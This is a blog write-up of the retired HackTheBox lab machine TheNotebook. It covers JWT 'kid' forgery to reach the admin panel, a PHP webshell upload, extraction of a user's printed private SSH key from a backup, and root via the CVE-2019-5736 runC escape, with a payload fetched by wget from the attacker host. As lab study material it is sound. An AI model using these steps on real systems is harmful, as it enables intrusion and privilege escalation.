
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark)"
    href="../../theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark)"
          href="../../theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
          href="../../theme/pygments/sas.min.css">


  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">


    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">



  


 

<meta name="author" content="maggick" />
<meta name="description" content="This is a writeup about a retired HacktheBox machine: TheNotebook publish on Mars 6, 2021 by mostwanted002. This box is rated as a medium machine. It implies a JWT token, some PHP files and a docker exploit." />
<meta name="keywords" content="security, boot2root, HTB, JWT, docker, CVE-2019-5736, CVE">


  <meta property="og:site_name" content="maggick's logs"/>
  <meta property="og:title" content="HTB: The Notebook"/>
  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: TheNotebook publish on Mars 6, 2021 by mostwanted002. This box is rated as a medium machine. It implies a JWT token, some PHP files and a docker exploit."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="../../2021/08/htb-the-notebook.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2021-08-01 10:45:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="../../author/maggick.html">
  <meta property="article:section" content="security"/>
  <meta property="article:tag" content="security"/>
  <meta property="article:tag" content="boot2root"/>
  <meta property="article:tag" content="HTB"/>
  <meta property="article:tag" content="JWT"/>
  <meta property="article:tag" content="docker"/>
  <meta property="article:tag" content="CVE-2019-5736"/>
  <meta property="article:tag" content="CVE"/>
  <meta property="og:image" content="https://maggick.fr/media/image.png">

  <title>maggick's logs &ndash; HTB: The Notebook</title>

</head>
<body >
  <aside>
    <div>
      <a href="../../">
        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
      </a>

      <h1>
        <a href="../../">maggick's logs</a>
      </h1>

<p>Offensive security tales</p>

      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="../../pages/about.html">
                  About
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/notes.html">
                  Notes
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/tools.html">
                  Tools
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
              <i class="fab fa-github"></i>
            </a>
          </li>
          <li>
            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
          <li>
            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
              <i class="fab fa-stack-overflow"></i>
            </a>
          </li>
          <li>
            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
              <i class="fas fa-rss"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="../../">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="htb-the-notebook">HTB: The Notebook</h1>
    <p>
      Posted on 01 Aug 2021 in <a href="../../category/security.html">security</a>

        &#8226; 4 min read
    </p>
  </header>


  <div>
    <p><img class="align-left" src="/media/2021.08/thenotebook_card.png" alt="The Notebook Card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/320">TheNotebook</a> publish on
Mars 6, 2021 by
<a href="https://www.hackthebox.com/home/users/profile/120514">mostwanted002</a>.
This box is rated as a medium machine. It implies a JWT token, some PHP files
and a docker exploit.</p>


<h1>Foothold</h1>
<h2>Recon</h2>
<p>Let us start as always by a <code>nmap</code> scan. Only port 80 (HTTP) and 22 (SSH) are
open.</p>
<div class="highlight"><pre><span></span><code>Nmap scan report for 10.129.82.59
Host is up (0.013s latency).
Not shown: 65532 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
10010/tcp filtered rxapi
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div>

<h1>Web</h1>
<p>The website is an application to take notes. We can self register a user. We notice that:</p>
<ul>
<li>There is authorization control to access the notes but we need to know the UUID to access them.</li>
<li>The first note we upload start with the number 5. Being on a VIP box means that there is already existing notes.</li>
<li>The authentication is using a <a href="https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a">JWT token</a></li>
</ul>
<p>Our <a href="https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a">JWT token</a> has the following values:</p>
<div class="highlight"><pre><span></span><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9
{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;RS256&quot;,&quot;kid&quot;:&quot;http://localhost:7070/privKey.key&quot;}

eyJ1c2VybmFtZSI6InJyIiwiZW1haWwiOiJyQHIuY29tIiwiYWRtaW5fY2FwIjowfQ
{&quot;username&quot;:&quot;rr&quot;,&quot;email&quot;:&quot;r@r.com&quot;,&quot;admin_cap&quot;:0}
</code></pre></div>

<p>A few interesting point about this JWT token:</p>
<ol>
<li>the kid (Key ID) in the header is an URL</li>
<li>there is a <code>admin_cap</code> parameter in the JWT payload.</li>
</ol>
<p>We host a simple HTTP server using python3 and change the KID value by our IP
address and port and got a ping on it (with a 404).</p>
<p>We use <a href="https://gist.github.com/ygotthilf/baa58da5c3dd1f69fae9">ssh-keygen to generate a RS256 private key</a>
and we make it available using the python server.</p>
<div class="highlight"><pre><span></span><code>ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key
</code></pre></div>

<p>We use <a href="https://jwt.io/">https://jwt.io/</a> to generate a new token with the
<code>admin_cap</code> parameter to <code>1</code> and sign it using our private key.</p>
<p>By replacing our token with the new one we can now access the <a href="http://10.129.82.59/admin">admin panel</a>
an view all the notes including the ones from the "admin" user saying that PHP
files are being executed.</p>
<p>We use the admin panel to upload <code>simple-backdoor.php</code> (located in
<code>/usr/share/webshells/php</code> on Kali Linux).
We can now execute command on the system using our webshell.</p>
<p>We found a "home.tar.gz" archive in the <code>/backups/</code> folder.</p>
<div class="highlight"><pre><span></span><code>ls%20../../backups
apt.extended_states.0
apt.extended_states.1.gz
apt.extended_states.2.gz
home.tar.gz
</code></pre></div>

<p>We copy the archive to our parent directory and extract it.</p>
<div class="highlight"><pre><span></span><code>cmd=cp%20../../backups/home.tar.gz%20../
cmd=tar%20xvf%20../home.tar.gz%20-C%20../
home/
home/noah/
home/noah/.bash_logout
home/noah/.cache/
home/noah/.cache/motd.legal-displayed
home/noah/.gnupg/
home/noah/.gnupg/private-keys-v1.d/
home/noah/.bashrc
home/noah/.profile
home/noah/.ssh/
home/noah/.ssh/id_rsa
home/noah/.ssh/authorized_keys
home/noah/.ssh/id_rsa.pub
</code></pre></div>

<p>We can then get the "noah" user private SSH key.</p>
<div class="highlight"><pre><span></span><code>cmd=cat%20../home/noah/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAyqucvz6P/EEQbdf8cA44GkEjCc3QnAyssED3qq9Pz1LxEN04
HbhhDfFxK+EDWK4ykk0g5MvBQckcxAs31mNnu+UClYLMb4YXGvriwCrtrHo/ulwT
rLymqVzxjEbLUkIgjZNW49ABwi2pDfzoXnij9JK8s3ijIo+w/0RqHzAfgS3Y7t+b
HVo4kvIHT0IXveAivxez3UpiulFkaQ4zk37rfHO3wuTWsyZ0vmL7gr3fQRBndrUD
v4k2zwetxYNt0hjdLDyA+KGWFFeW7ey9ynrMKW2ic2vBucEAUUe+mb0EazO2inhX
rTAQEgTrbO7jNoZEpf4MDRt7DTQ7dRz+k8HG4wIDAQABAoIBAQDIa0b51Ht84DbH
+UQY5+bRB8MHifGWr+4B6m1A7FcHViUwISPCODg6Gp5o3v55LuKxzPYPa/M0BBaf
Q9y29Nx7ce/JPGzAiKDGvH2JvaoF22qz9yQ5uOEzMMdpigS81snsV10gse1bQd4h
CA4ehjzUultDO7RPlDtbZCNxrhwpmBMjCjQna0R2TqPjEs4b7DT1Grs9O7d7pyNM
Um/rxjBx7AcbP+P7LBqLrnk7kCXeZXbi15Lc9uDUS2c3INeRPmbFl5d7OdlTbXce
YwHVJckFXyeVP6Qziu3yA3p6d+fhFCzWU3uzUKBL0GeJSARxISsvVRzXlHRBGU9V
AuyJ2O4JAoGBAO67RmkGsIAIww/DJ7fFRRK91dvQdeaFSmA7Xf5rhWFymZ/spj2/
rWuuxIS2AXp6pmk36GEpUN1Ea+jvkw/NaMPfGpIl50dO60I0B4FtJbood2gApfG9
0uPb7a+Yzbj10D3U6AnDi0tRtFwnnyfRevS+KEFVXHTLPTPGjRRQ41OdAoGBANlU
kn7eFJ04BYmzcWbupXaped7QEfshGMu34/HWl0/ejKXgVkLsGgSB5v3aOlP6KqEE
vk4wAFKj1i40pEAp0ZNawD5TsDSHoAsIxRnjRM+pZ2bjku0GNzCAU82/rJSnRA+X
i7zrFYhfaKldu4fNYgHKgDBx8X/DeD0vLellpLx/AoGBANoh0CIi9J7oYqNCZEYs
QALx5jilbzUk0WLAnA/eWs9BkVFpQDTnsSPVWscQLqWk7+zwIqq0v6iN3jPGxA8K
VxGyB2tGqt6jI58oPztpabGBTCmBfh82nT2KNNHfwwmfwZjdsu9I9zvo+e3CXlBZ
vglmvw2DW6l0EwX+A+ZuSmiZAoGAb2mgtDMrRDHc/Oul3gvHfV6CYIwwO5qK+Jyr
2WWWKla/qaWo8yPQbrEddtOyBS0BP4yL9s86yyK8gPFxpocJrk3esdT7RuKkVCPJ
z2yn8QE6Rg+yWZpPHqkazSZO1eItzQR2mYG2hzPKFtE7evH6JUrnjm5LTKEreco+
8iCuZAcCgYEA1fhcJzNwEUb2EOV/AI23rYpViF6SiDTfJrtV6ZCLTuKKhdvuqkKr
JjwmBxv0VN6MDmJ4OhYo1ZR6WiTMYq6kFGCmSCATPl4wbGmwb0ZHb0WBSbj5ErQ+
Uh6he5GM5rTstMjtGN+OQ0Z8UZ6c0HBM0ulkBT9IUIUEdLFntA4oAVQ=
-----END RSA PRIVATE KEY-----
</code></pre></div>

<p>We use it to connect on the box as "noah" and get the user flag.</p>
<div class="highlight"><pre><span></span><code>└─$ ssh noah@10.129.82.59 -i id_rsa
&lt;SNIP&gt;
noah@thenotebook:~$ id
uid=1000(noah) gid=1000(noah) groups=1000(noah)
noah@thenotebook:~$ cat user.txt
4a22cbbbecb491a77b6659fdf00183ba
</code></pre></div>

<h1>root</h1>
<h2>Docker</h2>
<p>We enumerate our permission on the box.</p>
<div class="highlight"><pre><span></span><code>noah@thenotebook:~$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
</code></pre></div>

<p>Our user can execute command on the "webapp-dev01" docker machine. We can use
<code>sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash</code> to get a bash shell
inside the docker.</p>
<p>As docker is used we run the <a href="https://github.com/stealthcopter/deepce">deepce</a>
script on the host box. The script found that the docker version used it
vulnerable to a container escape exploit.</p>
<div class="highlight"><pre><span></span><code>noah@thenotebook:~$ sh deepce.sh

                      ##         .
                ## ## ##        ==
            ## ## ## ##       ===
        /&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;\___/ ===
    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~
        \______ X           __/
          \    \         __/
            \____\_______/
          __
    ____/ /__  ___  ____  ________
    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE
  / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE
  \__,_/\___/\___/ .___/\___/\___/  ESCAPE
                /_/

Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
by stealthcopter

==========================================( Colors )==========================================
[+] Exploit Test ............ Exploitable - Check this out
[+] Basic Test .............. Positive Result
[+] Another Test ............ Error running check
[+] Negative Test ........... No
[+] Multi line test ......... Yes
Command output
spanning multiple lines

Tips will look like this and often contains links with additional info. You can usually
ctrl+click links in modern terminal to open in a browser window
See https://stealthcopter.github.io/deepce

===================================( Enumerating Platform )===================================
grep: /proc/1/cgroup: No such file or directory
grep: /proc/1/cgroup: No such file or directory
grep: /proc/1/cgroup: No such file or directory
[+] Inside Container ........ No
[+] User .................... noah
[+] Groups .................. noah
[+] Container tools ......... Yes
/usr/bin/docker
/usr/bin/lxc
[+] Docker Executable ....... /usr/bin/docker
[+] Docker version .......... 18.06.0-ce
[+] User in Docker group .... No
[+] Docker Sock ............. Yes
srw-rw---- 1 root docker 0 Mar  7 10:10 /var/run/docker.sock

[+] Sock is writable ........ No
To see full info from the docker sock output run the following

curl -s --unix-socket /var/run/docker.sock http://localhost/info

[+] Docker Exploits ......... 18.06.0-ce
[+] CVE–2019–13139 .......... deepce.sh: 139: printf: 0-ce: not completely converted
Yes
Docker versions before 18.09.4 are vulnerable to a command execution vulnerability when
parsing URLs

[+] CVE–2019–5736 ........... deepce.sh: 139: printf: 0-ce: not completely converted
Yes
Docker versions before 18.09.2 are vulnerable to a container escape by overwriting the
runC binary

==================================( Enumerating Containers )==================================
==============================================================================================
</code></pre></div>

<p>A quick Google search return us a simple <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">CVE-2019-5736 PoC</a>
written in Golang.</p>
<p>We modify the <code>main.go</code> file with the payload <code>var payload = "#!/bin/bash \n cat /root/root.txt &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow"</code>
and compile it using <code>go build main.go</code>. We then download it from the docker and
run it.</p>
<div class="highlight"><pre><span></span><code>noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
root@893ea5c84398:/opt/webapp# cd /tmp/
root@893ea5c84398:/tmp# wget http://10.10.14.28:8000/main
--2021-03-08 17:07:53--  http://10.10.14.28:8000/main
&lt;SNIP&gt;
2021-03-08 17:07:53 (10.8 MB/s) - ‘main’ saved [2236814/2236814]

root@893ea5c84398:/tmp# chmod +x main
root@893ea5c84398:/tmp# ./main
[+] Overwritten /bin/sh successfully
[+] Found the PID: 103
[+] Successfully got the file handle
[+] Successfully got write handle &amp;{0xc0004078c0}
root@893ea5c84398:/tmp#
</code></pre></div>

<p>On another terminal on the "thenotebook" host we run the following command (our exploit binary rewrite
<code>/bin/sh</code> so we need to call that command) and get the private flag.</p>
<div class="highlight"><pre><span></span><code>noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
No help topic for &#39;/bin/sh&#39;
noah@thenotebook:~$ ls /tmp/
home  shadow  systemd-private-0c3e87bdcb724a669778cfa72c5b4017-systemd-timesyncd.service-vsSHAh  tmux-1000  vmware-root_611-3980232955
noah@thenotebook:~$ cat /tmp/shadow
e16458a8ec21a020bb382e56d8f0ed42
</code></pre></div>

<h1>Wrapping up</h1>
<p>An interesting box as working with JWT token is more and more common. The docker
exploit is simple to use. A nice box overall.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="../../tag/security.html">security</a>
      <a href="../../tag/boot2root.html">boot2root</a>
      <a href="../../tag/htb.html">HTB</a>
      <a href="../../tag/jwt.html">JWT</a>
      <a href="../../tag/docker.html">docker</a>
      <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
      <a href="../../tag/cve.html">CVE</a>
    </p>
  </div>


  <div class="neighbors">
    <a class="btn float-left" href="../../2021/07/htb-armageddon.html" title="HTB: Armageddon">
      <i class="fa fa-angle-left"></i> Previous Post
    </a>
    <a class="btn float-right" href="../../2021/08/htb-love.html" title="HTB: Love">
      Next Post <i class="fa fa-angle-right"></i>
    </a>
  </div>



</article>

    <footer>
<p>
  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="../../theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>

</body>
</html>